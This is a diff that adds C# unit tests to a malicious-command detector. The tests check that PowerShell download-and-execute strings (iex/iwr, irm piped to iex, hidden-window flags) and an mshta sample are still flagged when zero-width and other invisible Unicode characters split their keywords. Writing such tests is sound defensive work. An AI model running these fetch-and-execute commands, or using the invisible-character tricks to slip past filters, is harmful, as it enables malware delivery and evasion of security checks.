@@ -211,6 +211,36 @@ public class CommandBypassTests
         AssertMalicious($"{Ps} {dash}enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA=");
     }
 
+    // ---- 看不見的字元拆開關鍵字 ----
+
+    [Theory]
+    [InlineData(0x00AD)]
+    [InlineData(0x200B)]
+    [InlineData(0x200D)]
+    [InlineData(0x2060)]
+    [InlineData(0xFEFF)]
+    [InlineData(0x180E)]
+    [InlineData(0x3164)]
+    [InlineData(0xFFA0)]
+    [InlineData(0xE0041)]
+    public void 看不見的字元拆開關鍵字仍攔截(int codePoint)
+    {
+        var c = char.ConvertFromUtf32(codePoint);
+        var ps = "pow" + c + "ershell";
+        var iex = "i" + c + "ex";
+        AssertMalicious($"{ps} -w h{c}idden -c \"{iex}(i{c}wr 'https://example.invalid/a')\"");
+        AssertMalicious($"i{c}rm https://example.invalid/a | {iex}");
+        AssertMalicious(HtaSample("ms" + c + "hta"));
+    }
+
+    [Fact]
+    public void 一般文字裡的軟連字號仍是乾淨()
+    {
+        var shy = char.ConvertFromUtf32(0x00AD);
+        AssertClean($"I use power{shy}shell every day");
+        AssertClean($"in{shy}ter{shy}na{shy}tion{shy}al");
+    }
+
     // ---- 不該誤報 ----
 
     [Theory]
